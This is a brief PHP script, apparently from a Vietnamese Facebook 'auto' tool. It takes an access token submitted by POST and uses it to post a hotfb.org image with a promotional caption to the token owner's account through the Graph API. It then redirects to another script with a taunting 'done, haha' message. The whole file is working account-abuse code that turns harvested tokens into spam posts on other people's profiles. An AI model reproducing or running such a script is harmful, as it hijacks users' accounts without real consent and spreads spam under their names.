<?php
header( 'Content-Type: text/html; charset=UTF-8' );
$access_token= $_POST['access_token'];
auto('https://graph.facebook.com/photos/?access_token='.$access_token.'&caption=FAQ_HotFB_Org&url=http://hotfb.org/images/cu-co-gai.jpg&method=post');
mbalek('/DuySexy.php?Lady=rpToken&i='.urlencode('Xong Rồi Haha !!!'));


function auto($url){
$data = curl_init();
curl_setopt($data, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($data, CURLOPT_URL, $url);
$hasil = curl_exec($data);
curl_close($data);
return $hasil;
}
function mbalek($x){
print '<meta http-equiv="refresh" content="0;url='.$x.'"/>';
}
?>